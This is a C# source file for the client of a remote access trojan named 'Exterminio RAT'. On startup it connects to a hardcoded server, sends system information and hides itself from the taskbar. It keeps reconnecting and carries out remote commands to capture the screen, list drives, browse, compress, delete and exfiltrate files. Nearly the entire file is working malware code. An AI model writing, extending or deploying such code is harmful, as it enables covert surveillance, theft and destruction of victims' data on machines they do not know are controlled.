using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Exterminio_RAT_Cliente
{
    public partial class Form1 : Form
    {
        private TcpClient ClienteTcp = new TcpClient();
        private int Puerto = 8080; // Puerto por defecto del servidor
        private string DireccionIp = "192.168.1.103"; // Localhost para pruebas
        private bool isConnected = false;
        private ScreenCaptureHandler screenCaptureHandler;
        private DiskDetectionHandler diskDetectionHandler;
        private Mutex captureMutex = new Mutex(false, "CaptureMutex");
        private Mutex diskDetectionMutex = new Mutex(false, "DiskDetectionMutex");
        private Mutex abrirDiscoMutex = new Mutex(false, "AbrirDiscoMutex");
        private Mutex compresionMutex = new Mutex(false, "CompresionMutex");
        private Mutex borrarMutex = new Mutex(false, "BorrarMutex");
        private Mutex descargarMutex = new Mutex(false, "DescargarMutex");
        private Mutex socketMutex = new Mutex(false, "SocketMutex");

        public Form1()
        {
            InitializeComponent();
            screenCaptureHandler = new ScreenCaptureHandler(this);
            diskDetectionHandler = new DiskDetectionHandler(this);
            SetupForm();
        }

        private void SetupForm()
        {
            // Configurar el formulario para conexión automática
            this.Load += Form1_Load;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Conectar automáticamente al cargar el formulario
            ConnectToServer();
        }

        private void ConnectToServer()
        {
            try
            {
                if (!isConnected)
                {
                    // Usar las variables de IP y puerto directamente
                    ClienteTcp = new TcpClient();
                    ClienteTcp.Connect(DireccionIp, Puerto);
                    isConnected = true;
                    
                    // Enviar información del sistema al conectarse
                    EnviarInformacionSistema();
                    
                    // Mostrar mensaje de conexión exitosa
                    Console.WriteLine($"Conectado automáticamente a {DireccionIp}:{Puerto}");
                    
                    // Ocultar el formulario después de conectar (opcional)
                    this.WindowState = FormWindowState.Minimized;
                    this.ShowInTaskbar = false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error de conexión automática: {ex.Message}");
                
                // Reintentar conexión después de 5 segundos
                System.Threading.Timer reconnectTimer = null;
                reconnectTimer = new System.Threading.Timer((state) =>
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        Console.WriteLine("Reintentando conexión...");
                        ConnectToServer();
                    });
                    reconnectTimer?.Dispose();
                }, null, 5000, Timeout.Infinite);
            }
        }

        private Task ListenForCommands(NetworkStream stream)
        {
            try
            {
                byte[] buffer = new byte[31457280];
                
                while (isConnected && ClienteTcp.Connected)
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    
                    if (bytesRead == 0)
                    {
                        // Conexión cerrada
                        break;
                    }
                    
                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"Comando recibido: {command}");
                    
                    // Procesar comandos
                    switch (command.Trim())
                    {
                        case "CAP":
                            _ = HandleCaptureCommandWithMutex(stream);
                            break;
                        case "DISCOS":
                            _ = HandleDiskDetectionCommandWithMutex(stream);
                            break;
                        default:
                                                // Verificar si es un comando ABRIRDISCO con ruta
                    if (command.StartsWith("ABRIRDISCO:"))
                    {
                        string ruta = command.Substring(11); // "ABRIRDISCO:" tiene 11 caracteres
                        _ = HandleAbrirDiscoCommandWithMutex(stream, ruta);
                    }
                    // Verificar si es un comando COMPRIMIR con ruta
                    else if (command.StartsWith("COMPRIMIR:"))
                    {
                        string ruta = command.Substring(10); // "COMPRIMIR:" tiene 10 caracteres
                        _ = HandleComprimirCommandWithMutex(stream, ruta);
                    }
                    // Verificar si es un comando BORRAR con ruta
                            else if (command.StartsWith("BORRAR:"))
        {
            string ruta = command.Substring(7); // "BORRAR:" tiene 7 caracteres
            _ = HandleBorrarCommandWithMutex(stream, ruta);
        }
        else if (command.StartsWith("DESCARGAR:"))
        {
            string ruta = command.Substring(10); // "DESCARGAR:" tiene 10 caracteres
            _ = HandleDescargarCommandWithMutex(stream, ruta);
        }
                            else
                            {
                                Console.WriteLine($"Comando no reconocido: {command}");
                            }
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error escuchando comandos: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private Task HandleCaptureCommandWithMutex(NetworkStream stream)
        {
            try
            {
                Console.WriteLine("Comando CAP recibido, verificando Mutex...");
                
                // Intentar adquirir el Mutex de captura
                if (captureMutex.WaitOne(1000)) // Esperar máximo 1 segundo
                {
                    try
                    {
                        Console.WriteLine("Mutex de captura adquirido, procesando CAP...");
                        return screenCaptureHandler.HandleCaptureCommand(stream, socketMutex);
                    }
                    finally
                    {
                        // Liberar el Mutex
                        captureMutex.ReleaseMutex();
                        Console.WriteLine("Mutex de captura liberado");
                    }
                }
                else
                {
                    Console.WriteLine("Ya hay una captura en proceso, ignorando comando CAP");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en HandleCaptureCommandWithMutex: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private Task HandleDiskDetectionCommandWithMutex(NetworkStream stream)
        {
            try
            {
                Console.WriteLine("Comando DISCOS recibido, verificando Mutex de detección de discos...");
                
                // Intentar adquirir el Mutex de detección de discos (independiente)
                if (diskDetectionMutex.WaitOne(1000)) // Esperar máximo 1 segundo
                {
                    try
                    {
                        Console.WriteLine("Mutex de detección de discos adquirido, procesando DISCOS...");
                        return diskDetectionHandler.HandleDiskDetectionCommand(stream, socketMutex);
                    }
                    finally
                    {
                        // Liberar el Mutex
                        diskDetectionMutex.ReleaseMutex();
                        Console.WriteLine("Mutex de detección de discos liberado");
                    }
                }
                else
                {
                    Console.WriteLine("Ya hay una detección de discos en proceso, ignorando comando DISCOS");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en HandleDiskDetectionCommandWithMutex: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private Task HandleAbrirDiscoCommandWithMutex(NetworkStream stream, string ruta)
        {
            try
            {
                Console.WriteLine("Comando ABRIRDISCO recibido, verificando Mutex de explorador de archivos...");
                
                // Intentar adquirir el Mutex de explorador de archivos (independiente)
                if (abrirDiscoMutex.WaitOne(1000)) // Esperar máximo 1 segundo
                {
                    try
                    {
                        Console.WriteLine("Mutex de explorador de archivos adquirido, procesando ABRIRDISCO...");
                        return AbrirDiscoHandler.HandleAbrirDiscoCommand(stream, ruta);
                    }
                    finally
                    {
                        // Liberar el Mutex
                        abrirDiscoMutex.ReleaseMutex();
                        Console.WriteLine("Mutex de explorador de archivos liberado");
                    }
                }
                else
                {
                    Console.WriteLine("Ya hay una exploración de archivos en proceso, ignorando comando ABRIRDISCO");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en HandleAbrirDiscoCommandWithMutex: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private Task HandleComprimirCommandWithMutex(NetworkStream stream, string ruta)
        {
            try
            {
                Console.WriteLine("🗜️ Comando COMPRIMIR recibido, verificando Mutex de compresión...");
                
                // Verificar si ya hay una compresión en proceso
                if (compresionMutex.WaitOne(1000)) // Esperar máximo 1 segundo
                {
                    try
                    {
                        Console.WriteLine("Mutex de compresión adquirido, procesando COMPRIMIR...");
                        return HandleComprimirCommand(stream, ruta);
                    }
                    finally
                    {
                        // Liberar el mutex
                        compresionMutex.ReleaseMutex();
                        Console.WriteLine("Mutex de compresión liberado");
                    }
                }
                else
                {
                    Console.WriteLine("Ya hay una compresión en proceso, ignorando comando COMPRIMIR");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en HandleComprimirCommandWithMutex: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private Task HandleBorrarCommandWithMutex(NetworkStream stream, string ruta)
        {
            try
            {
                Console.WriteLine("🗑️ Comando BORRAR recibido, verificando Mutex de borrado...");
                
                // Verificar si ya hay un borrado en proceso
                if (borrarMutex.WaitOne(1000)) // Esperar máximo 1 segundo
                {
                    try
                    {
                        Console.WriteLine("Mutex de borrado adquirido, procesando BORRAR...");
                        return HandleBorrarCommand(stream, ruta);
                    }
                    finally
                    {
                        // Liberar el mutex
                        borrarMutex.ReleaseMutex();
                        Console.WriteLine("Mutex de borrado liberado");
                    }
                }
                else
                {
                    Console.WriteLine("Ya hay un borrado en proceso, ignorando comando BORRAR");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en HandleBorrarCommandWithMutex: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private async Task HandleComprimirCommand(NetworkStream stream, string ruta)
        {
            try
            {
                Console.WriteLine($"🗜️ Procesando comando COMPRIMIR para ruta: {ruta}");
                
                // Procesar la solicitud de compresión
                CompressionResponse response = CompressionRequestProcessor.ProcesarSolicitudCompresion(ruta);
                
                // Comprimir y codificar la respuesta
                string responseData = response.ComprimirYCodificar();
                
                if (!string.IsNullOrEmpty(responseData))
                {
                    // Enviar respuesta al servidor
                    byte[] responseBytes = Encoding.UTF8.GetBytes(responseData);
                    await stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                    
                    Console.WriteLine($"Respuesta de compresión enviada al servidor: {response.Estado}");
                }
                else
                {
                    Console.WriteLine("Error: No se pudo codificar la respuesta de compresión");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando comando COMPRIMIR: {ex.Message}");
            }
        }

        private async Task HandleBorrarCommand(NetworkStream stream, string ruta)
        {
            try
            {
                Console.WriteLine($"🗑️ Procesando comando BORRAR para ruta: {ruta}");
                
                // Procesar la solicitud de borrado
                DeleteResponse response = DeleteRequestProcessor.ProcesarSolicitudBorrado(ruta);
                
                // Comprimir y codificar la respuesta
                string responseData = response.ComprimirYCodificar();
                
                if (!string.IsNullOrEmpty(responseData))
                {
                    // Enviar respuesta al servidor
                    byte[] responseBytes = Encoding.UTF8.GetBytes(responseData);
                    await stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                    
                    Console.WriteLine($"Respuesta de borrado enviada al servidor: {response.Estado}");
                }
                else
                {
                    Console.WriteLine("Error: No se pudo codificar la respuesta de borrado");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando comando BORRAR: {ex.Message}");
            }
        }

        private Task HandleDescargarCommandWithMutex(NetworkStream stream, string ruta)
        {
            try
            {
                Console.WriteLine("📥 Comando DESCARGAR recibido, verificando Mutex de descarga...");
                
                // Verificar si ya hay una descarga en proceso
                if (descargarMutex.WaitOne(1000)) // Esperar máximo 1 segundo
                {
                    try
                    {
                        Console.WriteLine("Mutex de descarga adquirido, procesando DESCARGAR...");
                        return HandleDescargarCommand(stream, ruta);
                    }
                    finally
                    {
                        // Liberar el mutex
                        descargarMutex.ReleaseMutex();
                        Console.WriteLine("Mutex de descarga liberado");
                    }
                }
                else
                {
                    Console.WriteLine("Ya hay una descarga en proceso, ignorando comando DESCARGAR");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en HandleDescargarCommandWithMutex: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private async Task HandleDescargarCommand(NetworkStream stream, string ruta)
        {
            try
            {
                Console.WriteLine($"📥 Procesando comando DESCARGAR para ruta: {ruta}");
                
                // Procesar la solicitud de descarga
                DownloadResponse response = DownloadRequestProcessor.ProcesarSolicitudDescarga(ruta);
                
                // Comprimir y codificar la respuesta
                string responseData = response.ComprimirYCodificar();
                
                if (!string.IsNullOrEmpty(responseData) && !responseData.StartsWith("ERROR:"))
                {
                    try
                    {
                        // Enviar respuesta al servidor
                        byte[] responseBytes = Encoding.UTF8.GetBytes(responseData);
                        await stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                        
                        Console.WriteLine($"✅ Respuesta de descarga enviada al servidor: {response.Estado}");
                        Console.WriteLine($"📊 Tamaño de respuesta: {responseData.Length} caracteres");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"❌ Error enviando respuesta de descarga: {ex.Message}");
                    }
                }
                else
                {
                    Console.WriteLine($"❌ Error: No se pudo codificar la respuesta de descarga: {responseData}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando comando DESCARGAR: {ex.Message}");
            }
        }

        private void EnviarInformacionSistema()
        {
            try
            {
                if (ClienteTcp != null && ClienteTcp.Connected)
                {
                    // Crear paquete de información
                    PaqueteInformacionEnvio paquete = new PaqueteInformacionEnvio();
                    
                    // Comprimir y codificar la información
                    string datosCodificados = paquete.ComprimirYCodificar();
                    
                    if (!string.IsNullOrEmpty(datosCodificados))
                    {
                        // Obtener stream de red
                        NetworkStream stream = ClienteTcp.GetStream();
                        
                        // Enviar información del sistema con prefijo "INFO:"
                        string infoMessage = "INFO:" + datosCodificados;
                        byte[] datos = Encoding.UTF8.GetBytes(infoMessage);
                        stream.Write(datos, 0, datos.Length);
                        
                        // Iniciar escucha de comandos del servidor
                        _ = Task.Run(() => ListenForCommands(stream));
                        stream.Flush();
                        
                        Console.WriteLine($"Información enviada: {paquete.ToString()}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enviando información: {ex.Message}");
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            try
            {
                // Desconectar al cerrar
                if (ClienteTcp != null && ClienteTcp.Connected)
                {
                    ClienteTcp.Close();
                    ClienteTcp.Dispose();
                }
                
                // Limpiar Mutex
                try
                {
                    captureMutex?.Dispose();
                    diskDetectionMutex?.Dispose();
                    abrirDiscoMutex?.Dispose();
                    compresionMutex?.Dispose();
            borrarMutex?.Dispose();
            descargarMutex?.Dispose();
                    socketMutex?.Dispose();
                    Console.WriteLine("Mutex limpiados correctamente");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error limpiando Mutex: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al cerrar conexión: {ex.Message}");
            }
            finally
            {
                base.OnFormClosing(e);
            }
        }
    }
}
